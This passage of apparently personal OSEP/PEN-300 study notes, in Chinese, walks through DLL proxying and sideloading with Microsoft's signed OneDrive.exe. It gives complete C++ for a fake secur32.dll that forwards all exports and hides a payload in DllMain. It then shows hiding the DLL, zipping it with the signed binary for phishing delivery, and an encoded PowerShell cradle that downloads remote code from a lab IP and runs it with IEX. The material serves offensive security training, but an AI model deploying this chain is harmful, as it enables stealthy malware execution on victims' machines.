> OneDrive 嘗試從目前工作目錄載入多個 DLL 文件，包括 `Secur32.dll`、`VERSION.dll`、 `WININET.dll`、`WTSAPI32.dll`等，但都導致 NAME NOT FOUND

### Proxying the Calls
目前已知 NAME NOT FOUND 的 DLL，使用 Secur32.dll 作為目標
🎯：創建一個同名且導出功能相同的偽造版本來注入 payload

有個問題是: 如果假的 DLL 沒有提供 OneDrive.exe 需要的 exported functions，程式會崩潰。所以要做 DLL proxying

>[!Note]
>[DLL Proxying](https://www.ired.team/offensive-security/persistence/dll-proxying-for-persistence):
>建立一個假的 DLL，但它看起來像真的 DLL:
>1. 匯出和原始 DLL 相同的函式名稱
>2. 把合法函式呼叫轉發到真正的系統 DLL
>3. 同時執行自訂 payload

Windows loader 預設主要看 `DLL 檔名`、`DLL 搜尋路徑`、`是否能載入`、`是否有需要的 exported functions` 不會自動要求 DLL 必須有 Microsoft 簽章\
![image](https://hackmd.io/_uploads/HkAKf7A7Gg.png)

建立 proxy DLL 的基本框架:\
使用 Visual Studio 建立一個 C++ Dynamic-Link Library project
```cpp
#include "pch.h"

#include <Windows.h>

#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
    {
        MessageBoxA(NULL, "Executing from Malicious DLL", "Executing from Malicious DLL", 0);
    }
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
> - `#include <Windows.h>`: 為了使用 Windows API
> - `DLLPATH`: 選擇真正 secur32.dll 的路徑
> (⚠️: 在 64-bit Windows 上，System32 其實是 64-bit DLL 目錄)
> - `GLOBALROOT`: 明確指向真正的系統 DLL，避免再次落入目前目錄的 fake DLL
> - `#pragma comment(linker, ...)`: fake DLL 匯出 GetUserNameExW，但實際上把它轉發到真正 secur32.dll 的 GetUserNameExW (export forwarding)
> - `BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)`: [DllMain](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain) 是 DLL 的 entry point，當 DLL 被載入或卸載時，Windows 會呼叫它
>    - `DLL_PROCESS_ATTACH`: DLL 第一次被 process 載入
>    - `DLL_THREAD_ATTACH`: process 建立新 thread
>    - `DLL_THREAD_DETACH`: thread 結束
>    - `DLL_PROCESS_DETACH`: DLL 從 process 卸載
>
> 當 fake Secur32.dll 被 OneDrive.exe 載入時彈出 MessageBox

compile DLL後，將檔案複製到 `C:\Tools`目錄下\
點擊執行 OneDrive.exe：\
![image](https://hackmd.io/_uploads/HJyKPF1EGg.png)
> 成功跳出 MessageBox

但跳轉到 OneDrive.exe 失敗：\
![image](https://hackmd.io/_uploads/HyInOFJVGe.png)

當 OneDrive.exe 繼續執行時，會期望原始的 secur32.dll 公開其他匯出的函數，例如 `DeleteSecurityContext`。由於我們在初始 proxy DLL 中只導出了一個 `GetUserNameExW` 函數，應用程式無法找到缺少的 symbol 造成 runtime error

為了保持應用程式的穩定性且避免被檢測到，該如何擴展 approach，自動匯出和轉發合法 DLL 所期望的所有函數

## Weaponizing ZIP Containers for Client-Side Execution
利用 ZIP archives 套件透過 DLL proxying 來傳遞和執行惡意負載。這項技術利用了已簽署可執行檔載入 DLL 的方式，透夠合法的 signed binary  與偽造的惡意 DLL 打包在 ZIP container 中。當 victim 打開 signed binary 惡意 payload 就會被執行，從而保持行為的合法性
```
payload.zip
├── OneDrive.exe      ← 合法 Microsoft-signed binary
└── secur32.dll       ← 特製 proxy DLL
```

1. 建立完整 proxy DLL
不能只 forward 一個 export，必須把目標程式會使用的所有 exports 都處理掉
2. 利用 DLL search order
讓 signed executable 優先找到同目錄的同名 DLL
3. 打包進 ZIP
把 signed EXE 與 proxy DLL 一起放進容器，保留兩者的相對位置

### Automating the Proxy DLL Build
上述寫了 `#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")`只處理 GetUserNameExW\
但 secur32.dll 不只有一個 export。透過 PEview 發現總共有 98 個 exported functions\
![image](https://hackmd.io/_uploads/rJtz-s1NMg.png)

🎯：利用 Python 腳本 [Perfect DLL Proxy](https://github.com/mrexodia/perfect-dll-proxy) 自動產生 exports
```
python perfect_dll_proxy.py secur32.dll
```
![image](https://hackmd.io/_uploads/rkjisRkNMe.png)

完整 secur32.cpp
```cpp
#include "pch.h"

#include <Windows.h>

#ifdef _WIN64
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\System32\\secur32.dll"
#else
#define DLLPATH "\\\\.\\GLOBALROOT\\SystemRoot\\SysWOW64\\secur32.dll"
#endif // _WIN64

#pragma comment(linker, "/EXPORT:AcceptSecurityContext=" DLLPATH ".AcceptSecurityContext")
#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleA=" DLLPATH ".AcquireCredentialsHandleA")
#pragma comment(linker, "/EXPORT:AcquireCredentialsHandleW=" DLLPATH ".AcquireCredentialsHandleW")
#pragma comment(linker, "/EXPORT:AddCredentialsA=" DLLPATH ".AddCredentialsA")
#pragma comment(linker, "/EXPORT:AddCredentialsW=" DLLPATH ".AddCredentialsW")
#pragma comment(linker, "/EXPORT:AddSecurityPackageA=" DLLPATH ".AddSecurityPackageA")
#pragma comment(linker, "/EXPORT:AddSecurityPackageW=" DLLPATH ".AddSecurityPackageW")
#pragma comment(linker, "/EXPORT:ApplyControlToken=" DLLPATH ".ApplyControlToken")
#pragma comment(linker, "/EXPORT:ChangeAccountPasswordA=" DLLPATH ".ChangeAccountPasswordA")
#pragma comment(linker, "/EXPORT:ChangeAccountPasswordW=" DLLPATH ".ChangeAccountPasswordW")
#pragma comment(linker, "/EXPORT:CompleteAuthToken=" DLLPATH ".CompleteAuthToken")
#pragma comment(linker, "/EXPORT:CredMarshalTargetInfo=" DLLPATH ".CredMarshalTargetInfo")
#pragma comment(linker, "/EXPORT:CredUnmarshalTargetInfo=" DLLPATH ".CredUnmarshalTargetInfo")
#pragma comment(linker, "/EXPORT:DecryptMessage=" DLLPATH ".DecryptMessage")
#pragma comment(linker, "/EXPORT:DeleteSecurityContext=" DLLPATH ".DeleteSecurityContext")
#pragma comment(linker, "/EXPORT:DeleteSecurityPackageA=" DLLPATH ".DeleteSecurityPackageA")
#pragma comment(linker, "/EXPORT:DeleteSecurityPackageW=" DLLPATH ".DeleteSecurityPackageW")
#pragma comment(linker, "/EXPORT:EncryptMessage=" DLLPATH ".EncryptMessage")
#pragma comment(linker, "/EXPORT:EnumerateSecurityPackagesA=" DLLPATH ".EnumerateSecurityPackagesA")
#pragma comment(linker, "/EXPORT:EnumerateSecurityPackagesW=" DLLPATH ".EnumerateSecurityPackagesW")
#pragma comment(linker, "/EXPORT:ExportSecurityContext=" DLLPATH ".ExportSecurityContext")
#pragma comment(linker, "/EXPORT:FreeContextBuffer=" DLLPATH ".FreeContextBuffer")
#pragma comment(linker, "/EXPORT:FreeCredentialsHandle=" DLLPATH ".FreeCredentialsHandle")
#pragma comment(linker, "/EXPORT:GetComputerObjectNameA=" DLLPATH ".GetComputerObjectNameA")
#pragma comment(linker, "/EXPORT:GetComputerObjectNameW=" DLLPATH ".GetComputerObjectNameW")
#pragma comment(linker, "/EXPORT:GetSecurityUserInfo=" DLLPATH ".GetSecurityUserInfo")
#pragma comment(linker, "/EXPORT:GetUserNameExA=" DLLPATH ".GetUserNameExA")
#pragma comment(linker, "/EXPORT:GetUserNameExW=" DLLPATH ".GetUserNameExW")
#pragma comment(linker, "/EXPORT:ImpersonateSecurityContext=" DLLPATH ".ImpersonateSecurityContext")
#pragma comment(linker, "/EXPORT:ImportSecurityContextA=" DLLPATH ".ImportSecurityContextA")
#pragma comment(linker, "/EXPORT:ImportSecurityContextW=" DLLPATH ".ImportSecurityContextW")
#pragma comment(linker, "/EXPORT:InitSecurityInterfaceA=" DLLPATH ".InitSecurityInterfaceA")
#pragma comment(linker, "/EXPORT:InitSecurityInterfaceW=" DLLPATH ".InitSecurityInterfaceW")
#pragma comment(linker, "/EXPORT:InitializeSecurityContextA=" DLLPATH ".InitializeSecurityContextA")
#pragma comment(linker, "/EXPORT:InitializeSecurityContextW=" DLLPATH ".InitializeSecurityContextW")
#pragma comment(linker, "/EXPORT:LsaCallAuthenticationPackage=" DLLPATH ".LsaCallAuthenticationPackage")
#pragma comment(linker, "/EXPORT:LsaConnectUntrusted=" DLLPATH ".LsaConnectUntrusted")
#pragma comment(linker, "/EXPORT:LsaDeregisterLogonProcess=" DLLPATH ".LsaDeregisterLogonProcess")
#pragma comment(linker, "/EXPORT:LsaEnumerateLogonSessions=" DLLPATH ".LsaEnumerateLogonSessions")
#pragma comment(linker, "/EXPORT:LsaFreeReturnBuffer=" DLLPATH ".LsaFreeReturnBuffer")
#pragma comment(linker, "/EXPORT:LsaGetLogonSessionData=" DLLPATH ".LsaGetLogonSessionData")
#pragma comment(linker, "/EXPORT:LsaLogonUser=" DLLPATH ".LsaLogonUser")
#pragma comment(linker, "/EXPORT:LsaLookupAuthenticationPackage=" DLLPATH ".LsaLookupAuthenticationPackage")
#pragma comment(linker, "/EXPORT:LsaRegisterLogonProcess=" DLLPATH ".LsaRegisterLogonProcess")
#pragma comment(linker, "/EXPORT:LsaRegisterPolicyChangeNotification=" DLLPATH ".LsaRegisterPolicyChangeNotification")
#pragma comment(linker, "/EXPORT:LsaUnregisterPolicyChangeNotification=" DLLPATH ".LsaUnregisterPolicyChangeNotification")
#pragma comment(linker, "/EXPORT:MakeSignature=" DLLPATH ".MakeSignature")
#pragma comment(linker, "/EXPORT:QueryContextAttributesA=" DLLPATH ".QueryContextAttributesA")
#pragma comment(linker, "/EXPORT:QueryContextAttributesW=" DLLPATH ".QueryContextAttributesW")
#pragma comment(linker, "/EXPORT:QueryCredentialsAttributesA=" DLLPATH ".QueryCredentialsAttributesA")
#pragma comment(linker, "/EXPORT:QueryCredentialsAttributesW=" DLLPATH ".QueryCredentialsAttributesW")
#pragma comment(linker, "/EXPORT:QuerySecurityContextToken=" DLLPATH ".QuerySecurityContextToken")
#pragma comment(linker, "/EXPORT:QuerySecurityPackageInfoA=" DLLPATH ".QuerySecurityPackageInfoA")
#pragma comment(linker, "/EXPORT:QuerySecurityPackageInfoW=" DLLPATH ".QuerySecurityPackageInfoW")
#pragma comment(linker, "/EXPORT:RevertSecurityContext=" DLLPATH ".RevertSecurityContext")
#pragma comment(linker, "/EXPORT:SaslAcceptSecurityContext=" DLLPATH ".SaslAcceptSecurityContext")
#pragma comment(linker, "/EXPORT:SaslEnumerateProfilesA=" DLLPATH ".SaslEnumerateProfilesA")
#pragma comment(linker, "/EXPORT:SaslEnumerateProfilesW=" DLLPATH ".SaslEnumerateProfilesW")
#pragma comment(linker, "/EXPORT:SaslGetContextOption=" DLLPATH ".SaslGetContextOption")
#pragma comment(linker, "/EXPORT:SaslGetProfilePackageA=" DLLPATH ".SaslGetProfilePackageA")
#pragma comment(linker, "/EXPORT:SaslGetProfilePackageW=" DLLPATH ".SaslGetProfilePackageW")
#pragma comment(linker, "/EXPORT:SaslIdentifyPackageA=" DLLPATH ".SaslIdentifyPackageA")
#pragma comment(linker, "/EXPORT:SaslIdentifyPackageW=" DLLPATH ".SaslIdentifyPackageW")
#pragma comment(linker, "/EXPORT:SaslInitializeSecurityContextA=" DLLPATH ".SaslInitializeSecurityContextA")
#pragma comment(linker, "/EXPORT:SaslInitializeSecurityContextW=" DLLPATH ".SaslInitializeSecurityContextW")
#pragma comment(linker, "/EXPORT:SaslSetContextOption=" DLLPATH ".SaslSetContextOption")
#pragma comment(linker, "/EXPORT:SealMessage=" DLLPATH ".SealMessage")
#pragma comment(linker, "/EXPORT:SeciAllocateAndSetCallFlags=" DLLPATH ".SeciAllocateAndSetCallFlags")
#pragma comment(linker, "/EXPORT:SeciAllocateAndSetIPAddress=" DLLPATH ".SeciAllocateAndSetIPAddress")
#pragma comment(linker, "/EXPORT:SeciFreeCallContext=" DLLPATH ".SeciFreeCallContext")
#pragma comment(linker, "/EXPORT:SecpFreeMemory=" DLLPATH ".SecpFreeMemory")
#pragma comment(linker, "/EXPORT:SecpTranslateName=" DLLPATH ".SecpTranslateName")
#pragma comment(linker, "/EXPORT:SecpTranslateNameEx=" DLLPATH ".SecpTranslateNameEx")
#pragma comment(linker, "/EXPORT:SetContextAttributesA=" DLLPATH ".SetContextAttributesA")
#pragma comment(linker, "/EXPORT:SetContextAttributesW=" DLLPATH ".SetContextAttributesW")
#pragma comment(linker, "/EXPORT:SetCredentialsAttributesA=" DLLPATH ".SetCredentialsAttributesA")
#pragma comment(linker, "/EXPORT:SetCredentialsAttributesW=" DLLPATH ".SetCredentialsAttributesW")
#pragma comment(linker, "/EXPORT:SspiCompareAuthIdentities=" DLLPATH ".SspiCompareAuthIdentities")
#pragma comment(linker, "/EXPORT:SspiCopyAuthIdentity=" DLLPATH ".SspiCopyAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiDecryptAuthIdentity=" DLLPATH ".SspiDecryptAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiEncodeAuthIdentityAsStrings=" DLLPATH ".SspiEncodeAuthIdentityAsStrings")
#pragma comment(linker, "/EXPORT:SspiEncodeStringsAsAuthIdentity=" DLLPATH ".SspiEncodeStringsAsAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiEncryptAuthIdentity=" DLLPATH ".SspiEncryptAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiExcludePackage=" DLLPATH ".SspiExcludePackage")
#pragma comment(linker, "/EXPORT:SspiFreeAuthIdentity=" DLLPATH ".SspiFreeAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiGetTargetHostName=" DLLPATH ".SspiGetTargetHostName")
#pragma comment(linker, "/EXPORT:SspiIsAuthIdentityEncrypted=" DLLPATH ".SspiIsAuthIdentityEncrypted")
#pragma comment(linker, "/EXPORT:SspiLocalFree=" DLLPATH ".SspiLocalFree")
#pragma comment(linker, "/EXPORT:SspiMarshalAuthIdentity=" DLLPATH ".SspiMarshalAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiPrepareForCredRead=" DLLPATH ".SspiPrepareForCredRead")
#pragma comment(linker, "/EXPORT:SspiPrepareForCredWrite=" DLLPATH ".SspiPrepareForCredWrite")
#pragma comment(linker, "/EXPORT:SspiUnmarshalAuthIdentity=" DLLPATH ".SspiUnmarshalAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiValidateAuthIdentity=" DLLPATH ".SspiValidateAuthIdentity")
#pragma comment(linker, "/EXPORT:SspiZeroAuthIdentity=" DLLPATH ".SspiZeroAuthIdentity")
#pragma comment(linker, "/EXPORT:TranslateNameA=" DLLPATH ".TranslateNameA")
#pragma comment(linker, "/EXPORT:TranslateNameW=" DLLPATH ".TranslateNameW")
#pragma comment(linker, "/EXPORT:UnsealMessage=" DLLPATH ".UnsealMessage")
#pragma comment(linker, "/EXPORT:VerifySignature=" DLLPATH ".VerifySignature")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

```
將原始 secur32.dll 改成 secur32.original.dll
利用新的 secur32.cpp complie 產生的 dll 取代 secur32.dll\
![image](https://hackmd.io/_uploads/HynJCAkVzl.png)
> 成功透過 proxy DLL forwards 到原始 `secur32.original.dll`

利用看似無害的 DLL 可以被利用來執行程式碼，同時保持受信任應用程式的預期行為\
👉🏻 整個有效 payload（ signed binary + malicious DLL）打包到一個 ZIP 中，演示在目標系統上執行任意程式碼

### Delivering the Goods
```
OneDrive.exe 啟動
→ 從同目錄載入 secur32.dll
→ proxy DLL 的 DllMain 被執行
→ payload 啟動
→ exports 被轉發到真正的 secur32.dll
→ OneDrive 本身繼續正常運作
```
嘗試將 `MessageBoxA(...)` 改成 `calc.exe`
```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
        {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);

        CreateProcessA(
            NULL,            
            (LPSTR)"calc.exe",
            NULL,         
            NULL,           
            FALSE,          
            0,              
            NULL,           
            NULL,           
            &si,            
            &pi             
        );
        }
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```
```
CreateProcessA(
    NULL,                // Application name
    "calc.exe",          // Command line
    NULL,                // Process security
    NULL,                // Thread security
    FALSE,               // 不繼承 handles
    0,                   // Creation flags
    NULL,                // 繼承目前 environment
    NULL,                // 繼承目前 working directory
    &si,                 // Startup information
    &pi                  // Process information output
);
```

把惡意 DLL 設成 Hidden
```powershell
attrib +h secur32.dll
```
![image](https://hackmd.io/_uploads/By1_tyxNfx.png)
> 設定後，檔案仍然存在，也能正常被 Windows loader 載入

![image](https://hackmd.io/_uploads/r13lYkeEze.png)

使用 7-Zip 建立 ZIP
```powershell
C:\Tools> powershell
Windows PowerShell
...

PS C:\Tools> & "C:\Program Files\7-Zip\7z.exe" a -tzip onedrive.zip .\OneDrive.exe .\secur32.dll

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29

Scanning the drive:
2 files, 5034824 bytes (4917 KiB)

Creating archive: onedrive_payload.zip

Add new data to archive: 2 files, 5034824 bytes (4917 KiB)


Files read from disk: 2
Archive size: 1941590 bytes (1897 KiB)
Everything is Ok
```
> 7-Zip 會保留 DLL 的 hidden attribute

攻擊把三種因素組合在一起: (執行了 OneDrive.exe 且真的正常開啟)
1. Trust
OneDrive.exe 是 Microsoft-signed
2. Stealth
secur32.dll 被標為 hidden
3. Continuity
OneDrive setup 仍正常運作

- 可從 Calculator 改成 PowerShell payload
```cpp
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason)
    {
        case DLL_PROCESS_ATTACH:
    {
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessA(
            NULL,
            (LPSTR)"cmd.exe /c powershell -ep bypass -enc  KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIANQAxAC4AMQA1ADEALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=",
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
         );

        }
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```
> Base64 Decode: `(New-Object System.Net.WebClient).DownloadString('http://192.168.251.151/run.txt') | IEX`
> - `| IEX`: 把下載回來的文字當 PowerShell 執行
```
explorer.exe
└── OneDrive.exe
    └── cmd.exe
        └── powershell.exe
```

# Phishing with Jscript

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSEP, PEN-300] Instructional notes - Part 2](https://chw41.github.io/b1og/osep-web-300-instructional-notes---part-2/)
 
# [Link to: "[OSEP, PEN-300] Instructional notes - Part 2"](https://chw41.github.io/b1og/osep-web-300-instructional-notes---part-2/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/osep-web-300-instructional-notes---part-3/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/osep-web-300-instructional-notes---part-4/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/osep-web-300-instructional-notes---part-5/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/osep-web-300-instructional-notes---part-6/)
